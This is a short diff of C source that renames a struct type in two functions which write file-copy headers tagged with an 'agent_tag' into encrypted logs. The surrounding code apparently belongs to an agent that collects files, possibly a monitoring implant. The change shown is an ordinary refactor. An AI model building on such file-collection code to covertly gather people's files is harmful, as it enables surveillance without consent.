@@ -839,19 +839,19 @@ BOOL Log_CryptCopyFile(WCHAR *src_path, char *dest_file_path, WCHAR *display_nam
 	BYTE *temp_buff;
 	BYTE *file_additional_data;
 	BYTE *log_file_header;
-	FileAdditionalData *file_additiona_data_header;
+	FILE_DATA *file_additiona_data_header;
 	DWORD header_len;
 	
 	WCHAR* to_display = (display_name) ? display_name : src_path;
 
 	// Crea l'header da scrivere nel file
-	if ( !(file_additional_data = (BYTE *)malloc(sizeof(FileAdditionalData) + wcslen(to_display) * sizeof(WCHAR))))
+	if ( !(file_additional_data = (BYTE *)malloc(sizeof(FILE_DATA) + wcslen(to_display) * sizeof(WCHAR))))
 		return FALSE;
-	file_additiona_data_header = (FileAdditionalData *)file_additional_data;
+	file_additiona_data_header = (FILE_DATA *)file_additional_data;
 	file_additiona_data_header->uVersion = LOG_FILE_VERSION;
 	file_additiona_data_header->uFileNameLen = wcslen(to_display) * sizeof(WCHAR);
 	memcpy(file_additiona_data_header+1, to_display, file_additiona_data_header->uFileNameLen);
-	log_file_header = Log_CreateHeader(agent_tag, file_additional_data, file_additiona_data_header->uFileNameLen + sizeof(FileAdditionalData), &header_len);
+	log_file_header = Log_CreateHeader(agent_tag, file_additional_data, file_additiona_data_header->uFileNameLen + sizeof(FILE_DATA), &header_len);
 	SAFE_FREE(file_additional_data);
 	if (!log_file_header)
 		return FALSE;
@@ -938,7 +938,7 @@ BOOL Log_CryptCopyEmptyFile(WCHAR *src_path, char *dest_file_path, WCHAR *displa
 	DWORD existent_file_size = 0;
 	BYTE *file_additional_data;
 	BYTE *log_file_header;
-	FileAdditionalData *file_additiona_data_header;
+	FILE_DATA *file_additiona_data_header;
 	DWORD header_len;
 	WCHAR to_display[MAX_PATH];
 
@@ -948,13 +948,13 @@ BOOL Log_CryptCopyEmptyFile(WCHAR *src_path, char *dest_file_path, WCHAR *displa
 		_snwprintf_s(to_display, sizeof(to_display)/sizeof(WCHAR), _TRUNCATE, L"%s [%dB]", src_path, existent_file_len);		
 
 	// Crea l'header da scrivere nel file
-	if ( !(file_additional_data = (BYTE *)malloc(sizeof(FileAdditionalData) + wcslen(to_display) * sizeof(WCHAR))))
+	if ( !(file_additional_data = (BYTE *)malloc(sizeof(FILE_DATA) + wcslen(to_display) * sizeof(WCHAR))))
 		return FALSE;
-	file_additiona_data_header = (FileAdditionalData *)file_additional_data;
+	file_additiona_data_header = (FILE_DATA *)file_additional_data;
 	file_additiona_data_header->uVersion = LOG_FILE_VERSION;
 	file_additiona_data_header->uFileNameLen = wcslen(to_display) * sizeof(WCHAR);
 	memcpy(file_additiona_data_header+1, to_display, file_additiona_data_header->uFileNameLen);
-	log_file_header = Log_CreateHeader(agent_tag, file_additional_data, file_additiona_data_header->uFileNameLen + sizeof(FileAdditionalData), &header_len);
+	log_file_header = Log_CreateHeader(agent_tag, file_additional_data, file_additiona_data_header->uFileNameLen + sizeof(FILE_DATA), &header_len);
 	SAFE_FREE(file_additional_data);
 	if (!log_file_header)
 		return FALSE;
